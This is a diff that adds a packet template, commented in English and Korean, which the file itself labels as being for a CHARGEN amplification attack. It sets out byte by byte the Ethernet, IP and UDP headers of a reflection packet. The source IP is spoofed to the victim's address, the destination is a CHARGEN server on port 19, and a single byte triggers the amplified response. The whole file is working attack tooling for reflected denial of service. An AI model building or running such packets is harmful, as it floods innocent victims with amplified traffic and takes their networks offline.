@@ -1,0 +1,28 @@
+# CHARGEN Packet Template
+# L4 CHARGEN Amplification 공격용
+
+# L2 :: Ethernet HEADER
+@DMAC:6  # dst MAC
+@SMAC:6  # src MAC
+08 00    # Type: IP
+
+# L3 :: IP Header
+45       # Version: 4, Header Length: 20
+00       # Differentiated Service Field: 0
+00 1d    # Total Length: 29 (20 IP + 8 UDP + 1 data)
+KK GG    # Identification (Random)
+40 00    # Flags: Don't Fragment
+40       # Time To Live: 64
+11       # Protocol: UDP
+@IPCHK:2 # Header Checksum
+@SIP:4   # Source IP (Spoofed - Victim)
+@DIP:4   # Destination IP (CHARGEN Server)
+
+# L4 :: UDP Header
+GK GG    # Source Port (Random)
+00 13    # Destination Port: 19 (CHARGEN)
+00 09    # UDP Length: 9 (8 header + 1 data)
+@UDPCHK:2 # UDP Checksum
+
+# Data (1 byte trigger)
+00       # Any single byte triggers response
